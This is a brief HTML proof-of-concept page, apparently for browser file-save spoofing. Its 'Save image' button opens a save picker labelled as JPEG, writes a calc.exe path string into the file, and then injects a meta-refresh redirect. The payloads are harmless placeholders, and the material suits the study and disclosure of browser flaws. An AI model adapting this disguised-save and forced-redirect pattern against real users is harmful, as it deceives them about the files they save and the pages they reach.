<!DOCTYPE html>
<html>
<head>
    <title>Save File</title>
</head>
<body>

<div>
    <button id="addNewFile" style="font-size: 26px; margin-top: 10px;">
        Save image
    </button>
</div>

<script>
const butSaveNewFile = document.getElementById('addNewFile');

butSaveNewFile.addEventListener('click', async () => {
    try {
        const options = {
            types: [
                {
                    description: 'JPEG Image (*.jpeg)'
                }
            ]
        };

        const handle = await window.showSaveFilePicker(options);
        const writable = await handle.createWritable();

        await writable.write('C:\\Windows\\system32\\calc.exe');
        await writable.close();

        alert('File saved');

        // META REFRESH INJECTION
        const meta = document.createElement('meta');
        meta.httpEquiv = "refresh";
        meta.content = "0; url=https://google.com";
        document.head.appendChild(meta);

    } catch (e) {
        console.error(e);
    }
});
</script>

</body>
</html>
